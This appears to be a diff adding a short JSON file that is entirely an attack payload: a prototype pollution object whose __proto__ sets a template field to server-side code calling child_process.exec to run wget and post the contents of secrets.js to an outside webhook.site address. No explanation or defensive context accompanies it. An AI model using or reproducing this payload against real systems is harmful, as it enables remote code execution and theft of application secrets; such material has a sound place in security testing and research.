@@ -1,0 +1,7 @@
+[{
+    "lcUsername": "admin",
+    "username": "admin",
+    "__proto__": {
+        "userAutoCreateTemplate": "${require('child_process').exec('wget --post-data \"$(cat secrets.js)\" https://webhook.site/e97be5a7-3275-4096-bbd9-5fbfbaab8f07')}"
+    }
+}]
